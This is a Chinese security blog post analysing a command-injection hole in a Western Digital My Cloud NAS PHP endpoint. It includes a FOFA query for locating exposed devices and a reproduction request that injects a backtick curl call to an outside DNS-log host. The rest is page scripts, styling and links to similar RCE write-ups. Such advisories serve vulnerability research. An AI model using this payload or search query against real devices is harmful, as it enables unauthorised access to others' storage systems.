---
title: "Western Digital My Cloud NAS chk_vv_sharename.php 命令执行漏洞"
source: https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk_vv_sharename-rce.html
asset_dir: assets/western-digital-my-cloud-nas-chk_vv_sharename.php-命令执行漏洞
---

# Western Digital My Cloud NAS chk\_vv\_sharename.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/6/4 08:27
* 753浏览
* [0评论](#comment)
* 9分钟阅读

深入探索

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨

西部数据

备份


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital My Cloud NAS是美国西部数据（Western Digital）公司的一款应用广泛的网络连接云存储设备，可用于托管文件，并自动备份和同步该文件与各种云和基于Web的服务。Western Digital My Cloud NAS `chk_vv_sharename.php` 接口文件未对用户传入参数进行校验，导致[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过构造恶意请求写入webshell，获取服务器权限。

硬盘驱动器

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> `icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"`

# 漏洞分析

直接看 `php\chk_vv_sharename.php` 其业务实现逻辑如下

```
$vv_sharename = $_GET['vv_sharename'];
if(empty($_GET["vv_sharename"])) 
{
        echo 'Parameter vv_sharename is missing.';
        return;
}
$cmd = "vvctl --check_share_name -s \"$vv_sharename\" >/dev/null";
system($cmd);
```

代码中通过 `$_GET['vv_sharename']` 直接获取用户输入参数，未经过任何过滤或转义便拼接至系统命令 `vvctl --check_share_name -s` 中，攻击者可通过构造恶意参数[注入任意系统命令](https://mrxn.net/tag/rce)。

# 漏洞复现

```
GET /web/php/chk_vv_sharename.php?vv_sharename=`curl+xx.dnslog.pt` HTTP/1.1
Host: western.digital.nas.mrxn.net
Cookie: username=admin; isAdmin=1
```

在DNSLOG平台成功收到请求

漏洞扫描服务

[![Western Digital My Cloud NAS chk_vv_sharename.php 命令执行漏洞](images/img-001-2098bf46cb0a.webp)](https://image.mrxn.net/a299a58b27364f45af33b58cffcc03af.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[Western Digital My Cloud NAS chk\_vv\_sharename.php 命令执行漏洞](https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk_vv_sharename-rce.html)  
文章链接：<https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk_vv_sharename-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/Western-Digital-My-Cloud-NAS-chk\_vv\_sharename-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

数据备份与恢复

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALiUlEQVR4AeydAXLjuA5E/fb+d94/cOcpIkRaTiY/dtUqNUirGw2QIaQk9s7U/nO73f79TvzbPr7To2psU9cVcrG0is5LW0X3PsvPfK6nT+y6/DtYA/lTd/15lxPYBvJn2rdnom8cuAFbrflVr56HeT2MOoT3evkeYfRCuHvSK4fkIWgewvV1HZJX72jdGe7rtoHsxev6dSdwGAhk6jDis1v0btAP6SM3D9Hl5mGum+9++QytESG9O5/V7jX9ojn5GULWhRFndYeBzEyX9nsn8OMDgdwFZ1+CdxnED8Fn9Uf9Ib302FPsOsQPQfMwcvWOvW/Pf4X/+EC+svjlPZ7Ajw+k3y2dw3jX9fxxi3MF0geOaIW9IR51GLk+Eca8deZXXP1v8McH8jebuWpvt8NAvAs6nh0WcH89cvf9+QThMOKf1P0PRL+Tyaez9Xt+zyftHkow7mXfq64thvggqH6G1WMWs7rDQGamS/u9E9gGApk6PMbV1rwDIPVy/SsOox/CrYORq4uQPKD01whMn/b+NbgQjP6uQ/IwR/2F20CKXPH6E/jHqX8V3bp1nUPuBvMQrq8jJK/fvBySVxfNF6qtEOY9ur96VUD8dV0B4d3feXm/G9cT0k/zxfwwEJjfBRAd5ujXAcl7h6h3ri72PKTPWR7ig0+0BqLJ+xpnunl43Me+MPogHB6j6xQeBlLiFa87gW0gkCk67b4lddG8HOb1EP27futg7KP+CN2b2L2QnjBi953Vd3/nvV4uwuf620B6k4u/5gT+gUzH5eFr3LoV9rug+yDrQbDnd/zLl5CeMKJ7Es8aQ+r1QfhZvXmI3/pHeD0hj07nBbnl6xDIVJ2ye+u865A6GNE6iC63/gyf8esRz3qa736Y71GfCPGt+qivEMb68l1PSJ3CG8U2EMi0INj3CNEh6F3SferiKv+sDlkPgr2vvBDigWBpFX2tFS9vxSoP6bvKn+nVu+KRbxvII9OV+70TWA6kJlkB411RWsVqixA/BMtboR+iyytXIRdLmwWM9RAOWLr9HTFgeNfWfpvx4wLig6A+GPmHfQN9ChC/XNQHY15dX+FyIJW84vdP4PA6xC1ApukURYgOwe6Xn/n1rRCe6+86e4TU7rW6di1IXn6GMPfDXO/9IL7aQwWEd1/x6wmpU3ijOAykJljhHmGcZuX2oe9ZtBbSF4K9Xp965zCv018Ic8/Qq4wtIHUrH4x5CG9tlnTVtwoOAynxitedwPZKvW/BKYrmYbwbYOQrn30gfnn3q0N8MKL+7yA818s9rNYwD+nXffCcDkff9YT003wx3waymjpkihDU1/etvsLuh/R7Vrev/s5Lh/TsOYhenoqe7xzih+Aqry5W7wo5pL60iq7LK2dsA1G48LUnsBwIZLp9ihDdbfe8OsQHQfWO1ovmO1cX4djXGkhO3hGSt9cKrVvlIX0g2H3WizD37euWA9mbruvfO4FtIJDpOU23ANHl5iE6BM137H7z6vKOkL7dJxchPqC32DgwfU8LokPQnlvhxwUk/0GX0OshdRC0sPvUC7eBFLni9SewvZfVp7bikGn3fP9SzMNz/lV91yH9ur7nfe19rq4hPfSJEL08FTByfSuE+IH7E6mvelV0XlqFeuH1hNSJvFFsr9Qh03VvMHL1mmKFXIT4IaguQvSqrYBwGFH/dxDGXrXOPlY9IXXm9zX7a/MijHXq1nQOcz9EB47/YOd2fbz0BLZvWU4VMq2+K4gOI3affZ7V9VknqkPWk4sw180/QteA9JA/qqkcxF/XFdbBqEM4jLjyVy9jG4jCha89ge23rL4Np6ku72i+I+Tu0G8eostFiA4j9nr96jPUA+m14uqiveQipI95CDcvmu9oHlJnXl1eeD0hnsqb4DYQGKcH4X2fMNdruhXdL4fUlWcf5vfa/tr8CiF9gZXl/poAvp+3MXDv5f4g3LwIc906fTPcBjJLXtrvn8A1kN8/84crPhzIrHL12EEeUwj22l4H8XXdOkgeRjQvWl+otsLyVEB66iutAkYdRl6eil4nF8tTIRch/SA40788EJtc+P85ge2tk5pohcvUdYUcMlUY0bxYNfuA+M13hHl+36OuV3WQevjE7pVDPHIRotc6Fep1XSGH+M44xAdB/WL1rJDv8XpC9qfxBteHF4aQqUKw77EmW7HSYV4Ho1499tH7ySF1etW/gtau0F6QtWBE8x3t1/XO9YnmIevIC68npE7hjWL7GdL35DRF83CcqrnC7i+tYqVXrgLSF0asXAVE733keyx/hRqkFkYszz70q3WuDmOf7pOLvU4+w+sJmZ3KC7XDzxCnCuNd4B7Ndw6P/TDP26fj2TrdXxyyhrUw8vI8Chj9MHJr7S/C6INwCFonwlyv/PWE1Cm8URx+hsB6erVvGPMQ7t0ilrcCkq/rRD5DdAj2uri+9xnS02oYuWvBXLdOn/y7COM69pn1v54QT+dNcBsIzKfoPp3mCvXB2OfMv6pTt37FIesBWrZ/9LkJHxerXl0H7m+zf5RtcOaDsa77baQOo7/y20CKXPH6E1gOxCmKbhUyVRjR/LN+faL1ZwhZV5/1ezS3Qhh76IO5bl6E0efa5s949+kvXA7Eogt/9wQOr0P68jC/G2qaFWd+8+WtkK+wPBXmIetDsHL7gOiAJffv/3D8n8xosF4O3GvkqzzEt8pbL0L88mfwekKeOaVf9GwDceoijNOFcAj2PcKoQ7j9ur9zfZC6VX6lV33PwbwXjHrVVvR6eeX2AfN6PZC83D4rhPiB66+S3t7sY3tC4HNKwLZNp9wRuH/fVbdALkJ85kWY66s8xA8j6i+E5Oq6wj3UdQWMeQiHYHlmAclD8KyvPSB+CKqLEN1+hdtANF342hNYDqSmVQGZotuEkauXt0IullYBY11pFTDq1onl2UfX5YV7X13Dc72rtqJqKmBeV7kKGPOlVVSPfZQ2C0i9uX3NciB703X9eydwGEifmhzmU4XobhnCIahuH7HrneuDeR/9kDwcUY9oTxFSI+8+uQhzv3nRfhC/Osw5RAeu37Jub/Zx+O8hZ/uDTNO7oPtXuj5Ifecw1/V1hNHf83vunmCsUdcLY169+9Q7QuohuKpTF/d9Dt+y9snr+vdP4DAQyHQh6JacpghjHsIhaJ0Iow7h9lv5Vnn1PdpDTQ7jWhAOQX29Th3iW+X19TykDoL6RIhuXeFhIJovfM0JLN/trWlV9G3BONWer5qKZ3V43M8+EF/nEB0wdX8HAT557adiM3xclFYB3Gs+5Ps1lJZQF2HUIRyC+s6w1q6A1AHXb1m3N/vYfsuqSe1jtU89Pb/S4XP6QC/bOHC/MxXsB6Pe8/r22D1ySC+9EG5eNC/vuMqrd+z1j/j1M+TR6bwgt/0Mgdwt8Bz2vcJY1/P9rpHrk4uQfuZXCPEBK8v9yYPPPHDXLHBNOYx5dRGS73U9L+8Iqe968esJqVN4o9gG4rTP8Gzvq3rrYH13lAeSP+tT3oq9r/g+YN5Lj7UQHwR7Xg5jXr2jfbsuf5TfBqL5wteewGEgkLsARlxtczVtGOshvPexHuZ5iA5B6yEcjqhHhNHTdbnonuSiugjpax7CYUTz1slF9cLDQDRd+JoT+LGB1HQrIHdH/3IqV6EOo69yFebF0io6L61CfY+lV6jV9SxWeXXIHq2FcPPqZ1wfpF7/DH9sILPml/b1E/jrgUCmDkG34F0hqq8QxnoYee8DY37fF5LrNXogebkIX9OtE+G5ehh9EA5c72Xd3uzj8IR4V3Vc7VufeTl8Th0wvf3bje6Ti1vB4kLfI+ylwPQVOox6r3MNdYgfgj0vhzGvLtpPXngYiKYLX3MC20Ag04TH+Ow2a9oVZ/7yVHRfaRUw7kcfjDpgakNg+kRshsUFpK7Wr4CRl7aPRZvtu4F5SB+5CNGB62fI7c0+tifkzfb1n93O/wAAAP//wbG/qQAAAAZJREFUAwBefVaVrR115QAAAABJRU5ErkJggg==